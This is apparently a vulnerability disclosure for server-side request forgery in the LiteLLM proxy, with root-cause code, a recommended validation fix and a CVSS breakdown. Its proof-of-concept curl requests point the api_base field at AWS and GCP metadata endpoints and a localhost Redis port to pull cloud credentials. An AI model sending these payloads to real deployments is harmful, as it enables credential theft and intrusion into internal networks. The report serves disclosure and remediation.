# SSRF via Unvalidated api_base Parameter in litellm/litellm

**Target:** BerriAI/litellm
**Version:** ≤ 1.x (all versions with proxy support)
**CVSS:** 8.2 High (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N)
**CWE:** CWE-918: Server-Side Request Forgery (SSRF)
**Date:** 2026-03-24

---

## Summary

The LiteLLM proxy server and router accept arbitrary `api_base` and `base_url` parameters without validating against private IP ranges, cloud metadata endpoints, or localhost. An authenticated user (or any network peer in exposed deployments) can supply SSRF payloads to:

- Access AWS/GCP/Azure cloud metadata endpoints (`169.254.169.254/`, `metadata.google.internal/`)
- Scan internal services (Redis, PostgreSQL, Elasticsearch on RFC1918 ranges)
- Exfiltrate data by chaining with internal service exploits
- Bypass network segmentation in containerized deployments

---

## Root Cause

**File:** `litellm/main.py` (lines 2389-2395, 5385-5387)
**File:** `litellm/llms/openai/chat/gpt_transformation.py` (lines 665-691)

```python
# No validation of api_base whatsoever
def get_complete_url(self, api_base: Optional[str], ...):
    if api_base is None:
        api_base = "https://api.openai.com"
    endpoint = "chat/completions"
    api_base = api_base.rstrip("/")
    return f"{api_base}/{endpoint}"  # Directly concatenated, no URL validation
```

**File:** `litellm/proxy/guardrails/custom_code/primitives.py` (lines 308-322)

```python
def is_valid_url(url: str) -> bool:
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])  # Only checks presence of scheme + netloc
    except Exception:
        return False
```

This "validation" only verifies a URL has a scheme and netloc — it **does NOT prevent**:
- Private IP addresses (`10.0.0.0/8`, `192.168.0.0/16`, `172.16.0.0/12`, `127.0.0.1`)
- Cloud metadata endpoints (`169.254.169.254`, `metadata.google.internal`, `metadata.internal`)
- Localhost URLs (`http://localhost:6379`, `http://127.0.0.1:5432`)
- File scheme (`file:///etc/passwd`)

---

## Proof of Concept

### Setup

```bash
# Start LiteLLM proxy (default: localhost:4000)
litellm --model gpt-3.5-turbo --port 4000
```

### Exploit

```bash
# SSRF: AWS cloud metadata
curl -X POST http://localhost:4000/chat/completions \
  -H "Content-Type: application/json" \
  -d '{
    "model": "gpt-3.5-turbo",
    "messages": [{"role": "user", "content": "test"}],
    "api_base": "http://169.254.169.254/latest/meta-data/"
  }'

# SSRF: Localhost Redis
curl -X POST http://localhost:4000/chat/completions \
  -H "Content-Type: application/json" \
  -d '{
    "model": "gpt-3.5-turbo",
    "messages": [{"role": "user", "content": "test"}],
    "api_base": "http://127.0.0.1:6379/",
    "openai_api_key": "sk-dummy"
  }'

# SSRF: GCP metadata
curl -X POST http://localhost:4000/v1/chat/completions \
  -H "Content-Type: application/json" \
  -d '{
    "model": "gpt-3.5-turbo",
    "messages": [{"role": "user", "content": "test"}],
    "api_base": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity"
  }'
```

### Expected Result

Requests are forwarded to the specified `api_base` without filtering. The attacker can:
1. Observe HTTP response times to infer service availability
2. Chain with protocol-specific exploits (Redis RESP injection, HTTP request smuggling, etc.)
3. Exfiltrate credentials from cloud metadata endpoints
4. Access internal APIs exposed on RFC1918 ranges

---

## Impact

| Scenario | Risk |
|----------|------|
| LiteLLM in AWS/GCP/Azure environment | Read IAM credentials, instance metadata via `169.254.169.254/` or `metadata.google.internal/` |
| LiteLLM in Kubernetes cluster | Access internal services (in-cluster DNS, kube-dns, kubelet API on `10.0.0.1`) |
| Docker Compose deployment | Scan sibling containers on internal bridge network; access databases |
| Exposed via HTTPS load balancer | Unauthenticated SSRF if proxy is public-facing |

---

## Vulnerable Code Locations

| File | Function | Line | Issue |
|------|----------|------|-------|
| `litellm/main.py` | `completion()` | 2389-2395 | Passes `api_base` from kwargs directly to `logging.post_call()` without validation |
| `litellm/llms/openai/chat/gpt_transformation.py` | `get_complete_url()` | 665-691 | Concatenates `api_base` directly into URL string without validation |
| `litellm/proxy/proxy_server.py` | Router handlers | 5385-5387 | Accepts `api_base` from POST request body without validation |
| `litellm/router.py` | `set_model_list()` | 515-516 | Allows model configs to specify arbitrary URLs |
| `litellm/proxy/guardrails/custom_code/primitives.py` | `is_valid_url()` | 308-322 | Insufficient URL validation — only checks for scheme + netloc presence |

---

## Fix

Add centralized SSRF protection function:

```python
import ipaddress
import socket
from urllib.parse import urlparse

def is_safe_url(url: str) -> bool:
    """Validates URL against SSRF attack patterns."""
    try:
        parsed = urlparse(url)

        # Block non-HTTP schemes
        if parsed.scheme not in ("http", "https"):
            return False

        hostname = parsed.hostname
        if not hostname:
            return False

        # Block known cloud metadata hostnames
        blocked_hostnames = {
            "169.254.169.254",
            "metadata.google.internal",
            "metadata.internal",
            "169.254.169.253",  # Azure
        }
        if hostname.lower() in blocked_hostnames:
            return False

        # Try to parse as IP address
        try:
            ip = ipaddress.ip_address(hostname)
            if ip.is_loopback or ip.is_private or ip.is_link_local:
                return False
        except ValueError:
            # It's a hostname, not an IP — allow (DNS rebinding protection is separate)
            pass

        return True
    except Exception:
        return False


# Usage in all api_base handling:
def get_complete_url(self, api_base: Optional[str], ...):
    if api_base is None:
        api_base = "https://api.openai.com"

    if not is_safe_url(api_base):
        raise ValueError(f"Invalid api_base: {api_base}")

    endpoint = "chat/completions"
    api_base = api_base.rstrip("/")
    return f"{api_base}/{endpoint}"
```

Apply to all locations:
1. `litellm/main.py` — `completion()` function, validate `api_base` kwarg
2. `litellm/llms/openai/chat/gpt_transformation.py` — `get_complete_url()` method
3. `litellm/proxy/proxy_server.py` — All route handlers accepting `api_base`
4. `litellm/router.py` — `set_model_list()`, validate URLs in model configs
5. `litellm/proxy/guardrails/custom_code/primitives.py` — Replace `is_valid_url()` with `is_safe_url()`

---

## Additional Findings

### High Priority

**API Key Leakage in Exception Messages** (`litellm/exceptions.py:1012`)
- Original exception strings are appended to error messages without sanitization
- If exceptions contain API URLs or credentials, they may be logged

### Medium Priority

**Environment Variable Exposure** (`litellm/router.py:515`)
- Model configs can reference arbitrary env vars via `os.environ/VAR_NAME`
- Enables env var enumeration if model list is user-controllable

---

## CVSS Score Justification

**CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N = 8.2**

- **AV:N** — Network-accessible proxy endpoint
- **AC:L** — No authentication bypass required (authenticated user can exploit)
- **PR:L** — Requires valid API key or proxy access
- **UI:N** — No user interaction needed
- **S:C** — Scope changes (affects cloud provider infrastructure)
- **C:H** — High confidentiality impact (cloud credentials, internal data)
- **I:N** — No integrity impact (read-only access to metadata)
- **A:N** — No availability impact

---

## Testing Verification Script

See `verify_litellm_ssrf.py` in findings directory.

```bash
python3 verify_litellm_ssrf.py --endpoint http://localhost:4000/v1/chat/completions
```
